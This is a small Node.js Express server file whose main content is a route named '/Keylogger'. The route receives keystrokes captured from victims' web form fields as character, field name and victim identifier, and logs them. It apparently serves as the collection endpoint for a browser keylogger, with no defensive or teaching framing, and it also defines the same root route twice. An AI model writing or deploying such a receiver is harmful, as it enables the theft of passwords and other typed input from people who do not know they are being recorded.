var express = require('express')
var app = express()

// Static files
app.use(express.static('public'))

app.get('/', function (req, res) {
  res.send('Hello World!')
})

app.listen(8000, function () {
  console.log('Example app listening on port 8000!')
})

app.get('/', function(req, res){
    res.send('Hello');
})


app.get('/Keylogger', function(req, res){
    var recievedData = req.query.k;
console.log("data = ", recievedData);
    
    if(!recievedData || recievedData === null ){ 
        res.send('didn\'t understand your log');        
    } else {    
        
        var data = recievedData.split(',');
        var value = data[0];
        var field = data[1];
        var unique = data[2];


        res.send('Logged request for field ' + field + ', containing a character: ' + value + ' against unique number ' + unique );
    }
})